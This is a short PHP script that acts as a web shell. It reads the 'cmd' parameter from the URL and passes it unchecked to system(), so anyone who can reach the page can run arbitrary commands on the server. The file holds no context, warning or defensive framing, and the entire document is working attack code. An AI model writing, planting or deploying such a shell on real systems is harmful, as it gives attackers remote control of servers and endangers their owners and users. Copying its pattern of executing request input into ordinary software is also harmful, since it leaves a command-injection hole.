<?php
// Get the 'cmd' parameter from the URL
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // Execute the command
    system($cmd);
} else {
    echo "Usage: ?cmd=<command>";
}
?>
